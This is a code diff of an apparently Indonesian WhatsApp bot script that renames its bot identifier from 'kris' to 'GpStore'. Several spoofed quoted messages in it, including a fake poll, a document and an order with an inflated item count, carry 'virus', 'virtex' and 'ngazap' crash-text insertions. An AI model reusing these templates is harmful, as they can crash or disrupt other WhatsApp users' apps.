@@ -51,7 +51,7 @@ chats: {},
 ...(global.db || {})
 }
 
-module.exports = kris = async (kris, m, chatUpdate, store) => {
+module.exports = GpStore = async (GpStore, m, chatUpdate, store) => {
 try {
         const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
         const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
@@ -65,8 +65,8 @@ try {
         const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
-        const botNumber = await kris.decodeJid(kris.user.id)
-        const itsMekris = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const botNumber = await GpStore.decodeJid(GpStore.user.id)
+        const itsMeGpStore = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const quoted = m.quoted ? m.quoted : m
@@ -111,15 +111,15 @@ try {
         const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
         const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
         const UltahCreator = new Date('Januari 19, 2023 00:00:00')
-        const Creatorkristi = new Date().getTime()
-        const krisBotWA = UltahCreator - Creatorkristi
-        const krishari = Math.floor( krisBotWA / (1000 * 60 * 60 * 24));
-        const krisjam = Math.floor( krisBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
-        const krismenit = Math.floor( krisBotWA % (1000 * 60 * 60) / (1000 * 60))
-        const krisdetik = Math.floor( krisBotWA % (1000 * 60) / 1000)
+        const CreatorGpStoreti = new Date().getTime()
+        const GpStoreBotWA = UltahCreator - CreatorGpStoreti
+        const GpStorehari = Math.floor( GpStoreBotWA / (1000 * 60 * 60 * 24));
+        const GpStorejam = Math.floor( GpStoreBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
+        const GpStoremenit = Math.floor( GpStoreBotWA % (1000 * 60 * 60) / (1000 * 60))
+        const GpStoredetik = Math.floor( GpStoreBotWA % (1000 * 60) / 1000)
         const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
         const senderNumber = sender.split('@')[0]
-        const groupMetadata = m.isGroup ? await kris.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupMetadata = m.isGroup ? await GpStore.groupMetadata(m.chat).catch(e => {}) : ''
         const groupName = m.isGroup ? groupMetadata.subject : ''
         const participants = m.isGroup ? await groupMetadata.participants : ''
         const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
@@ -130,7 +130,7 @@ try {
     	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     	const isPrem = prem.includes(sender)
     	const isUser = pendaftar.includes(sender)
-    	const banUser = await kris.fetchBlocklist()
+    	const banUser = await GpStore.fetchBlocklist()
         const isBanned = banUser ? banUser.includes(m.sender) : false
     	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
     	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
@@ -156,7 +156,7 @@ afkReason: '',
 console.error(err)
 }
 
-if (!kris.public) {
+if (!GpStore.public) {
 if (!m.key.fromMe) return
 }
 
@@ -190,7 +190,7 @@ console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${a
 return m.reply('�? �? 」Sabar Bang 5 Detik/Command')
 }
 
-if (isCmd && !itsMekris) antiSpam.addFilter(from)
+if (isCmd && !itsMeGpStore) antiSpam.addFilter(from)
 
 for (let jid of mentionUser) {
 let user = global.db.users[jid]
@@ -214,30 +214,30 @@ user.afkTime = -1
 user.afkReason = ''
 }
 
-if (m.sender.startsWith('212')) return kris.updateBlockStatus(m.sender, 'block')
-if (m.key.remoteJid == 'status@broadcast') return kris.sendReadReceipt(from, m.sender, [m.key.id])
+if (m.sender.startsWith('212')) return GpStore.updateBlockStatus(m.sender, 'block')
+if (m.key.remoteJid == 'status@broadcast') return GpStore.sendReadReceipt(from, m.sender, [m.key.id])
 
-async function sendkrisMessage(chatId, message, options = {}){
+async function sendGpStoreMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
     if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
     if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
-    return await kris.relayMessage(chatId, generate.message, { messageId: generate.key.id })
+    return await GpStore.relayMessage(chatId, generate.message, { messageId: generate.key.id })
 }
 
 const sendSticker = (pesan) => {
-kris.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
+GpStore.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
 }
 
 try {
-ppimg = await kris.profilePictureUrl(m.sender, 'image')
+ppimg = await GpStore.profilePictureUrl(m.sender, 'image')
 } catch (err) {
 ppimg = 'https://telegra.ph/file/8441f8eb9faafc71eaadf.jpg'
 }
 ppnyaimg = await reSize(ppimg, 300, 300)
 
 const sendvn = (teks) => {
-kris.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+GpStore.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
 }
 
 for (let anju of vnnye) {
@@ -256,7 +256,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `kris Bot WhatsApp`, 
+"caption": `GpStore Bot WhatsApp`, 
 "jpegThumbnail": ppnyaimg
 }
 }
@@ -267,7 +267,7 @@ key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...(from ? {
-remoteJid: '62882007324217@s.whatsapp.net' } : {}) }, 
+remoteJid: '62858428854987@s.whatsapp.net' } : {}) }, 
 message: { 
 extendedTextMessage: { 
 text: `${m.pushName}`, 
@@ -294,7 +294,7 @@ sellerJid: '0@s.whatsapp.net'
 };
 
 const reply = (teks) => {
-kris.sendMessage(from, { text: teks ,
+GpStore.sendMessage(from, { text: teks ,
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
@@ -303,7 +303,7 @@ isForwarded: true
 }
 
 const banRep = () => {
-kris.sendMessage(m.chat, {
+GpStore.sendMessage(m.chat, {
 text:`Maaf Anda Sudah Di Banned Silahkan Chat @${creator.split("@")[0]} Untuk Membuka Nya`,
 mentions: [creator],
 },
@@ -330,18 +330,18 @@ participant: `0@s.whatsapp.net`,
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `kris Bot WhatsApp${ngazap(prefix)}`,
+"fileName": `GpStore Bot WhatsApp${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 
 let list = []
 for (let i of owner) {
 list.push({
-displayName: await kris.getName(i + '@s.whatsapp.net'),
+displayName: await GpStore.getName(i + '@s.whatsapp.net'),
 vcard: `BEGIN:VCARD\n
 VERSION:3.0\n
-N:${await kris.getName(i + '@s.whatsapp.net')}\n
-FN:${await kris.getName(i + '@s.whatsapp.net')}\n
+N:${await GpStore.getName(i + '@s.whatsapp.net')}\n
+FN:${await GpStore.getName(i + '@s.whatsapp.net')}\n
 item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
 item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
@@ -362,7 +362,7 @@ participant: `0@s.whatsapp.net`,
 },
 "message": {
 "pollCreationMessage": {
-"name": `kris Bot ${virus}${virtex(prefix)}`,
+"name": `GpStore Bot ${virus}${virtex(prefix)}`,
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -377,7 +377,7 @@ participant: `0@s.whatsapp.net`,
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI kris BOT"
+"optionName": "SALAM DARI GpStore BOT"
 	}
 ],
 "selectableOptionsCount": 5
@@ -387,7 +387,7 @@ const repPy = {
 	key: {
 		remoteJid: '0@s.whatsapp.net',
 		fromMe: false,
-		id: 'kris Bot',
+		id: 'GpStore Bot',
 		participant: '0@s.whatsapp.net'
 	},
 	message: {
@@ -397,7 +397,7 @@ const repPy = {
 			requestFrom: '0@s.whatsapp.net',
 			noteMessage: {
 				extendedTextMessage: {
-					text: 'Creator kris'
+					text: 'Creator GpStore'
 				}
 			},
 			expiryTimestamp: 999999999,
@@ -439,9 +439,9 @@ participant: `0@s.whatsapp.net`,
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `kris Bot WhatsApp${ngazap(prefix)}`,
-"orderTitle": "kris Bot WhatsApp${ngazap(prefix)}",
-"sellerJid": "62882007324217@s.whatsapp.net",
+"message": `GpStore Bot WhatsApp${ngazap(prefix)}`,
+"orderTitle": "GpStore Bot WhatsApp${ngazap(prefix)}",
+"sellerJid": "62858428854987@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -451,8 +451,8 @@ let rn = ['recording','composing']
 let jd = rn[Math.floor(Math.random() * rn.length)];
 
 if (command) {
-kris.sendPresenceUpdate(jd, from)
-kris.readMessages([m.key])
+GpStore.sendPresenceUpdate(jd, from)
+GpStore.readMessages([m.key])
 }
 
 function simpan(path, buff) {
@@ -476,7 +476,7 @@ console.log(color('Download Video With ytdl-core'))
 let nana = ytdl(Link)
 .pipe(fs.createWriteStream(mp4File))
 .on('finish', async () => {
-await kris.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
+await GpStore.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
 fs.unlinkSync(`./${mp4File}`)
 })
 } catch (err) {
@@ -492,7 +492,7 @@ console.log(color('Download Audio With ytdl-core'))
 ytdl(Link, { filter: 'audioonly' })
 .pipe(fs.createWriteStream(mp3File))
 .on('finish', async () => {
-await kris.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
+await GpStore.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
 fs.unlinkSync(mp3File)
 })
 } catch (err) {
@@ -501,7 +501,7 @@ reply(`${err}`)
 }
 
 async function sendPoll(jid, text, list) {
-kris.relayMessage(jid, {
+GpStore.relayMessage(jid, {
 "pollCreationMessage": {
 "name": text,
 "options": list.map(v => { return { optionName: v } }),
@@ -511,7 +511,7 @@ kris.relayMessage(jid, {
 }
 
 async function bygbt(text) {
-kris.sendMessage(text, {
+GpStore.sendMessage(text, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -565,7 +565,7 @@ async function sendFile(jid, media, options={}) {
         else if (mime == "webp") type = "sticker"
         else if (mime == "mp4") type = "video"
         else type = "document"
-        return kris.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
+        return GpStore.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
       }
 
 async function ephoto(url, texk) {
@@ -609,12 +609,12 @@ let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", 
 return build_server + data.image
 }
 
-async function genProfile(kris, m) {
+async function genProfile(GpStore, m) {
    let font = await Jimp.loadFont('./name.fnt'), 
      mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
      welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
-     avatar = await Jimp.read(await kris.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
-     status = (await kris.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
+     avatar = await Jimp.read(await GpStore.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
+     status = (await GpStore.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
      await avatar.resize(460, 460) 
      await mask.resize(460, 460) 
      await avatar.mask(mask) 
@@ -728,7 +728,7 @@ async function obfus(query) {
         );
         const result = {
             status: 200,
-            author: `kris`,
+            author: `GpStore`,
             result: obfuscationResult.getObfuscatedCode()
         }
         resolve(result)
@@ -820,7 +820,7 @@ footerText: footer,
 }
 }
 let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
-return kris.relayMessage(progene.key.remoteJid, progene.message, {
+return GpStore.relayMessage(progene.key.remoteJid, progene.message, {
 messageId: ""
 })
 }
@@ -829,12 +829,12 @@ async function replyprem(teks) {
     let buttons = [
     { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Upgrade Premium' }, type: 1 }
     ]
-    return kris.sendButtonText(m.chat, buttons, teks, `𝘉𝘺 𝘒𝘳𝘪𝘴𝘏𝘰𝘴𝘵𝘪𝘯𝘨:(`, m)
+    return GpStore.sendButtonText(m.chat, buttons, teks, `𝘉𝘺 𝘒𝘳𝘪𝘴𝘏𝘰𝘴𝘵𝘪𝘯𝘨:(`, m)
 }
 
 if (/hehe/g.test(m.body)) {
 let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-kris.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
+GpStore.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
 }
 
 if (autodltt) {
@@ -845,55 +845,55 @@ let buttons = [
 { buttonId: `.tiktokvideo ${url}`, buttonText: { displayText: 'Video' }, type: 1 },
 { buttonId: `.tiktokaudio ${url}`, buttonText: { displayText: 'Audio' }, type: 1 }
 ]
-await kris.sendButtonText(m.chat, buttons, `Auto Download Tiktok
+await GpStore.sendButtonText(m.chat, buttons, `Auto Download Tiktok
 
-Title : ${atdl.title}`, `Auto Downloader By kris`, ftext)
+Title : ${atdl.title}`, `Auto Downloader By GpStore`, ftext)
 }
 }
 
 if (autosticker) {
 if (/image/.test(mime) && !/webp/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await kris.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await GpStore.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime) && !/webp/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
 let media = await quoted.download()
-let encmedia = await kris.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await GpStore.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMekris && antilink) {
+if (m.isGroup && !m.key.fromMe && !itsMeGpStore && antilink) {
 if (!isBotAdmins) return
 if (budy.match(`chat.whatsapp.com`)) {
-kris.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
-kris.groupParticipantsUpdate(m.chat, [sender], 'remove')
+GpStore.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
+GpStore.groupParticipantsUpdate(m.chat, [sender], 'remove')
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMekris && antilinkyt) {
+if (m.isGroup && !m.key.fromMe && !itsMeGpStore && antilinkyt) {
 if (chath.match(/(youtu.be\/)/gi)) {
 reply(`*「 YOUTUBE LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link youtube, maaf kamu akan di kick`)
-await kris.groupParticipantsUpdate(m.chat, [sender], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await GpStore.groupParticipantsUpdate(m.chat, [sender], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 }
 
-if (m.isGroup && !m.key.fromMe && !itsMekris && antiwame) {
+if (m.isGroup && !m.key.fromMe && !itsMeGpStore && antiwame) {
 if (!isBotAdmins) return
 if (budy.match(`wa.me`)) {
-kris.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
-kris.groupParticipantsUpdate(m.chat, [sender], 'remove')
+GpStore.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
+GpStore.groupParticipantsUpdate(m.chat, [sender], 'remove')
 }
 }
 
 if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
 var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
 if (get_data_respon.isImage === false) {
-kris.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
+GpStore.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
 } else {
 buff = await getBuffer(get_data_respon.image_url)
-kris.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
+GpStore.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
 }
 }
 
@@ -904,10 +904,10 @@ return Math.floor(angka)
 if (!isCmd && isAlreadykaylaList(chath, dblist)) {
 var getkaydata = getDatakaylaList(chath, dblist)
 if (getkaydata.isImage === false) {
-kris.sendMessage(m.chat, { text: sendkaylaList(chath, dblist) }, { quoted: m })
+GpStore.sendMessage(m.chat, { text: sendkaylaList(chath, dblist) }, { quoted: m })
 } else {
 buff = await getBuffer(getkaydata.image_url)
-kris.sendImage(m.chat, buff, `${getkaydata.response}`, m)
+GpStore.sendImage(m.chat, buff, `${getkaydata.response}`, m)
 }
 }
 
@@ -928,17 +928,17 @@ listType: 1}
 
 switch (command) {
 case 'shutdown':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 reply(`Bye...`)
 await sleep(3000)
 process.exit()
 break
 case 'owner':{
-const repf = await kris.sendMessage(from, { 
+const repf = await GpStore.sendMessage(from, { 
 contacts: { 
 displayName: `${list.length} Kontak`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-kris.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
+GpStore.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
 }
 break
 case 'caridoi':
@@ -952,16 +952,16 @@ setTimeout(() => {
 reply('Berhasil Mendapatkan Satu Orang')
 }, 5000)
 setTimeout(() => {
-kris.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
+GpStore.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
 }, 9000)
 break
 case 'sc': case 'scriptbot': case 'scbot':{
-kris.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
+GpStore.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
 }
 break
 case 'q': case 'quoted': {
 if (!m.quoted) return reply('Reply Pesannya!!')
-let wokwol = await kris.serializeM(await m.getQuotedObj())
+let wokwol = await GpStore.serializeM(await m.getQuotedObj())
 if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
 await wokwol.quoted.copyNForward(m.chat, true)
 }
@@ -985,7 +985,7 @@ footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 
 buttonText: '𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 ',
 sections: seactiones,
 listType: 1}
-kris.sendMessage(from, listSw, { quoted: m })
+GpStore.sendMessage(from, listSw, { quoted: m })
 }
 break
 case 'jasasuntik':{
@@ -1004,7 +1004,7 @@ footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 
 buttonText: '𝙋𝙄𝙇𝙄𝙃 𝘿𝙄 𝙎𝙄𝙉𝙄',
 sections: seactiones,
 listType: 1}
-kris.sendMessage(from, listSw, { quoted: m })
+GpStore.sendMessage(from, listSw, { quoted: m })
 }
 break
 case 'topupgame':{
@@ -1024,7 +1024,7 @@ footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 
 buttonText: '𝙏𝙊𝙋𝙐𝙋 𝙂𝘼𝙈𝙀',
 sections: seactiones,
 listType: 1}
-kris.sendMessage(from, listSw, { quoted: m })
+GpStore.sendMessage(from, listSw, { quoted: m })
 }
 break
 case 'payment':{
@@ -1044,7 +1044,7 @@ footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 
 buttonText: '𝗣𝗔𝗬𝗠𝗘𝗡𝗧',
 sections: seactiones,
 listType: 1}
-kris.sendMessage(from, listSw, { quoted: m })
+GpStore.sendMessage(from, listSw, { quoted: m })
 }
 break
 case 'gttees':
@@ -1059,7 +1059,7 @@ exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
 fs.unlinkSync(ranm)
 buff = fs.readFileSync(rano)
 if (err) return reply(mess.error)
-kris.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
+GpStore.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
 fs.unlinkSync(rano)
 })
 })
@@ -1068,7 +1068,7 @@ case 'igstalk':{
 if (!isPrem) return replyprem(mess.premium)
 if (!q) return reply(`Contoh ${prefix+command} kirbotzx`)
 aj = await igstalk(`${q}`)
-kris.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
+GpStore.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
 `*/ Stalking Instagram \\*
 
 Fullname : ${aj.fullname}
@@ -1118,7 +1118,7 @@ break
 case 'ghstalk':{
 if (!q) return reply(`Contoh ${prefix+command} KirBotz`)
 aj = await githubstalk.githubstalk(`${q}`)
-kris.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
+GpStore.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
 `*/ Stalking Github \\*
 
 Username : ${aj.username}
@@ -1145,30 +1145,30 @@ break
 case 'ss': case 'ssweb':{
 if (!q) return reply(`Contoh ${prefix+command} link`)
 let krt = await scp1.ssweb(q)
-kris.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
+GpStore.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
 }
 break
 case 'join': {
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!text) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-await kris.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await GpStore.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'toonce': { 
 if (!quoted) return reply(`Reply Image/Video`)
 if (/image/.test(mime)) {
-anuan = await kris.downloadAndSaveMediaMessage(quoted)
-kris.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
+anuan = await GpStore.downloadAndSaveMediaMessage(quoted)
+GpStore.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
 } else if (/video/.test(mime)) {
-anuanuan = await kris.downloadAndSaveMediaMessage(quoted)
-kris.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
+anuanuan = await GpStore.downloadAndSaveMediaMessage(quoted)
+GpStore.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
 }
 }
 break
 case 'autodltt':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (args[0] == 'on') {
 if (autodltt) return reply('*Sudah Aktif!*')
 autodltt = true
@@ -1182,11 +1182,11 @@ let buttons = [
 { buttonId: '.autodltt on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.autodltt off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await kris.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
+await GpStore.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
 }
 break
 case 'autosticker':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (args[0] == 'on') {
 if (autosticker) return reply('*Sudah Aktif!*')
 autosticker = true
@@ -1200,15 +1200,15 @@ let buttons = [
 { buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await kris.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
+await GpStore.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
 }
 break
 case 'bc':
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Teks Nya Bang?`)
 let anu = await store.chats.all().map(v => v.id)
 for (let yoi of anu) {
-kris.sendMessage(yoi,{text:`INFORMASI
+GpStore.sendMessage(yoi,{text:`INFORMASI
 Buat User Bot
 
 ${q}`})
@@ -1216,19 +1216,19 @@ ${q}`})
 reply(`Succes`)
 break
 case 'ban':{
-if (!itsMekris) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 62882007324217`)
+if (!itsMeGpStore) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 62858428854987`)
 orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
-let ceknye = await kris.onWhatsApp(orgnye)
+let ceknye = await GpStore.onWhatsApp(orgnye)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 const isBane = banUser ? banUser.includes(orgnye) : false
 if (args[0] === "add") {
 if (isBane) return reply('User Sudah Dibanned')
-kris.updateBlockStatus(orgnye, 'block')
+GpStore.updateBlockStatus(orgnye, 'block')
 reply(`Succes Ban`)
 } else if (args[0] === "del") {
 if (!isBane) return reply('User Tidak Dibanned')
-kris.updateBlockStatus(orgnye, 'unblock')
+GpStore.updateBlockStatus(orgnye, 'unblock')
 reply(`Succes Unban`)
 } else {
 reply("Error")
@@ -1258,37 +1258,37 @@ text: teskd,
 footer: fake,
 title: "     �? List Participants Blockir �?",
 buttonText: "List Blockir",
-mentions: await kris.parseMention(teskd),
+mentions: await GpStore.parseMention(teskd),
 sections
 }
-kris.sendMessage(from, listMessage, {quoted:m})
+GpStore.sendMessage(from, listMessage, {quoted:m})
 } catch {
 reply("Tidak ada user yang diblockir")
 }
 }
 break
-case 'asupan': case 'bocil': case 'rikakrisriani':{
+case 'asupan': case 'bocil': case 'rikaGpStoreriani':{
 if (!isPrem) return replyprem(mess.premium)
 fdy = await fetchJson(`https://kirbotz-api.herokuapp.com/api/random/asupan/${command}?apikey=KirBotz`)
-kris.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
+GpStore.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'jadibot': {
 if (m.isGroup) return reply(mess.private)
 if (!isPrem) return replyprem(mess.premium)
-jadibot(kris, m, from)
+jadibot(GpStore, m, from)
 }
 break
 case 'listjadibot': 
 try {
-let user = [... new Set([...global.conns.filter(kris => kris.user).map(kris => kris.user)])]
+let user = [... new Set([...global.conns.filter(GpStore => GpStore.user).map(GpStore => GpStore.user)])]
 te = "*List Jadibot*\n\n"
 for (let i of user){
-y = await kris.decodeJid(i.id)
+y = await GpStore.decodeJid(i.id)
 te += " × User : @" + y.split("@")[0] + "\n"
 te += " × Name : " + i.name + "\n\n"
 }
-kris.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
